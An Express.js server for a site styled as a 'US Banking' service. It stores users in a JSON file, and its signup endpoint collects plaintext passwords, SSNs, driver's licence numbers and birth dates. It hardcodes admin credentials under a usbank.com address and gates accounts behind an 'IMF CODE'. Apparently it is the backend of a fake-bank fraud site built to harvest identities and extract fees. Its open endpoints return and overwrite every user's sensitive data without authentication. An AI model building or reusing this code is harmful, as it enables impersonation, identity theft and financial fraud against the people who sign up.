const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Path to users.json in your root folder
const DATA_FILE = path.join(__dirname, 'users.json');

// Helper function to read database
function readData() {
    if (!fs.existsSync(DATA_FILE)) {
        return { 
            users: {}, 
            settings: { auth_enabled: false, auth_code: "9999", auth_name: "IMF CODE" } 
        };
    }
    return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
}

// Helper function to write database
function writeData(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// Helper function to auto-assign 10-digit account numbers ending with sequential index if missing
function ensureAccountNumbers(db) {
    let index = 1;
    for (let username in db.users) {
        const user = db.users[username];
        const paddedIndex = String(index).padStart(4, '0');
        if (!user.account_number) {
            user.account_number = '471865' + paddedIndex;
        }
        if (!user.savings_account_number) {
            user.savings_account_number = '807470' + paddedIndex;
        }
        index++;
    }
}

// API: Get all users and global settings
app.get('/api/data', (req, res) => {
    const db = readData();
    ensureAccountNumbers(db);
    res.json(db);
});

// API: Save entire database state (users and settings from admin/dashboard)
app.post('/api/data', (req, res) => {
    const db = req.body;
    if (db && db.users) {
        let index = 1;
        for (let username in db.users) {
            const user = db.users[username];
            const paddedIndex = String(index).padStart(4, '0');
            if (!user.account_number) {
                user.account_number = '471865' + paddedIndex;
            }
            if (!user.savings_account_number) {
                user.savings_account_number = '807470' + paddedIndex;
            }
            index++;
        }
    }
    writeData(db);
    res.json({ success: true });
});

// API: Backward compatibility for user-only updates (signup and transfers)
app.post('/api/users', (req, res) => {
    const db = readData();
    const incomingUsers = req.body;
    let index = 1;
    for (let username in incomingUsers) {
        const user = incomingUsers[username];
        const paddedIndex = String(index).padStart(4, '0');
        
        // Preserve existing account numbers if they already exist, otherwise assign index-based ones
        if (db.users[username] && db.users[username].account_number) {
            user.account_number = db.users[username].account_number;
            user.savings_account_number = db.users[username].savings_account_number || ('807470' + paddedIndex);
        } else {
            if (!user.account_number) user.account_number = '471865' + paddedIndex;
            if (!user.savings_account_number) user.savings_account_number = '807470' + paddedIndex;
        }
        index++;
    }
    db.users = incomingUsers;
    writeData(db);
    res.json({ success: true });
});

// API: Dedicated Signup Endpoint with Index-based 10-digit Account Generation
app.post('/api/signup', (req, res) => {
    const db = readData();
    const username = req.body.username || req.body.email;
    
    if (!username) {
        return res.status(400).json({ success: false, message: 'Username or email is required' });
    }

    // Calculate sequential index based on total existing users + 1
    const userIndex = Object.keys(db.users).length + 1;
    const paddedIndex = String(userIndex).padStart(4, '0');
    
    // Generate 10-digit account numbers ending with the user index
    const checkingAcctNum = '471865' + paddedIndex;
    const savingsAcctNum = '807470' + paddedIndex;

    db.users[username] = {
        name: req.body.name || 'New User',
        email: req.body.email || username,
        password: req.body.password,
        account_number: checkingAcctNum,
        savings_account_number: savingsAcctNum,
        checking_bal: "0.00",
        savings_bal: "0.00",
        ssn: req.body.ssn || '',
        dl_number: req.body.dl_number || '',
        dob: req.body.dob || '',
        user_id: 'USR' + Math.floor(10000000000 + Math.random() * 90000000000),
        auth_enabled: false,
        auth_name: 'IMF CODE',
        auth_code: '',
        status: 'Active',
        admin_note: '',
        transactions: []
    };

    writeData(db);
    res.json({ success: true, account_number: checkingAcctNum });
});

// API: Admin Login verification (Credentials: admin@usbank.com / Emma123@sa)
app.post('/api/admin-login', (req, res) => {
    const { email, password } = req.body;
    if (email === 'admin@usbank.com' && password === 'Emma123@sa') {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false, message: 'Invalid admin credentials' });
    }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`US Banking server running on port ${PORT}`);
});
